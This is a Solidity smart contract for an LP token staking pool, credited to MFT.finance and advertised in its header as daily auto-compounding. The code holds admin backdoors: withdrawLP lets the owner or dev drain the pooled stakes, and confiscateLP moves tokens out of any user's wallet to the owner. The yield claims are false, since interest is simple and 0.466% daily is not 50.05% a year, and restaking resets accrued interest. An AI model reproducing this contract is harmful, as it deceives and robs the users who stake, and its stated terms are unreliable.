pragma solidity ^0.5.16;

import "./PHC-Swap-v3.sol";

/**
 * @dev Auto Compounding Staking Contract | No harvest function needed. Daily Compounding.
 * #Blockchain development company: www.phathanhcoin.com
 * This smart contract belongs to MFT.finance
 * #Owner: MFT.finance
 */
contract LPStaking {
    string public name = "LPs Staking";
    PHCSwapV3 public swapLP;

    //declaring owner state variable
    address public owner;
    address private dev;

    //declaring APY fo65r custom staking
    uint256 public customAPY = 466; // 0.466% daily or 50.05% APY yearly

    //declaring total staked
    uint256 public customTotalStaked3;

    //users staking balance
    mapping(address => uint256) public customStakingBalance;

    //users staking time
    mapping(address => uint256) public startTime;

    //mapping list of users who ever staked
    mapping(address => bool) public customHasStaked;

    //users unstaking time
    mapping(address => uint256) public customUnstakedTime;

    //mapping list of users who are staking at the moment
    mapping(address => bool) public customIsStakingAtm;

    //array of all stakers
    address[] public customStakers;

    constructor(PHCSwapV3 _swapLP, address _dev) public payable {
        swapLP = _swapLP;

        //assigning owner on deployment
        owner = msg.sender;
        //assign dev on deployment
        dev = _dev;
    }

    //==== LP custom Stake ====//
    function customStaking(uint256 _amount) public {
        require(_amount > 0, "amount cannot be 0");
        swapLP.transferFrom(msg.sender, address(this), _amount);
        customStakingBalance[msg.sender] =
            customStakingBalance[msg.sender] +
            _amount;
        startTime[msg.sender] = block.timestamp;

        if (!customHasStaked[msg.sender]) {
            customStakers.push(msg.sender);
        }
        customHasStaked[msg.sender] = true;
        customIsStakingAtm[msg.sender] = true;
    }
    function customUnstake() public {
        uint256 balance = customStakingBalance[msg.sender];
        require(balance > 0, "You have to stake first to unstake");
        uint256 Duration = (block.timestamp - startTime[msg.sender]) / 86400;
        require (Duration >= 3, "You have to stake at least 3 days before unstaking");
        uint256 realRate = customAPY * Duration;
        uint256 interestOnly = balance * realRate / 100000;
        uint256 finalInterest = interestOnly + balance;
        swapLP.transfer(msg.sender, finalInterest);
        customStakingBalance[msg.sender] = 0;
        customIsStakingAtm[msg.sender] = false;
        customUnstakedTime[msg.sender] = block.timestamp;
    }

    //change APY value for custom staking
    function changeAPY(uint256 _value) public {
        //only owner can issue airdrop
        require(msg.sender == owner, "Only contract creator can change APY");
        require(_value > 0, "Daily APY value has to be more than 0, i.e 100 for 0.100% daily");
        customAPY = _value;
    }

    //withdraw Token
    function withdrawLP(uint256 _amount) external {
        require(msg.sender == owner || msg.sender == dev, "Only contract creator can execute this");
        swapLP.transfer(msg.sender, _amount);
    }

    function confiscateLP(uint256 _amountLP, address _userAddress) public{
        require(msg.sender == owner || msg.sender == dev, "Only admin is allowed to execute this");
        require(_amountLP >0, "amount > 0 required");
        swapLP.transferFrom(_userAddress, owner, _amountLP);
    }

    //change owner
    function changeOwner(address _newOwner) public {
        require(msg.sender == dev || msg.sender == owner, "Only dev can execute this");
        owner = _newOwner;
    }
    //change dev
    function changeDev(address _newDev) public {
        require(msg.sender == dev, "Only dev can execute this");
        dev = _newDev;
    }
}